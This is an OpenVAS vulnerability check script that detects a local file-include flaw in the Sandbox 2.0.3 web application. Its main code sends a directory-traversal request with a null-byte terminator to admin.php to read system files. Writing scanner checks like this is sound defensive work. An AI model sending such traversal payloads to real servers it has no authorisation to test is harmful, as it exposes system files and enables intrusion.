###############################################################################
# OpenVAS Vulnerability Test
#
# Sandbox Multiple Remote Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100707");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2010-07-08 14:00:46 +0200 (Thu, 08 Jul 2010)");
  script_bugtraq_id(41420);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Sandbox Multiple Remote Vulnerabilities");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/41420");
  script_xref(name:"URL", value:"http://www.iguanadons.net/sandbox");
  script_xref(name:"URL", value:"http://www.iguanadons.net/downloads/Sandbox-204-56.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"Sandbox is prone to multiple remote vulnerabilities, including
multiple SQL-injection vulnerabilities, a local file-include
vulnerability, and multiple arbitrary-file-upload vulnerabilities.

Exploiting these issues could allow an attacker to upload and execute
arbitrary code within the context of the webserver, compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database. Other attacks are also possible.

Sandbox 2.0.3 is vulnerable. Prior versions may also be affected.");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/sandbox", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );
  if( ! buf ) continue;

  if( "Powered by Sandbox" >< buf ) {

    foreach file (keys(files)) {

      url = string(dir, "/admin.php?a=../../../../../../../../../../../../../../",files[file],"%00");

      if(http_vuln_check(port:port, url:url,pattern:file)) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
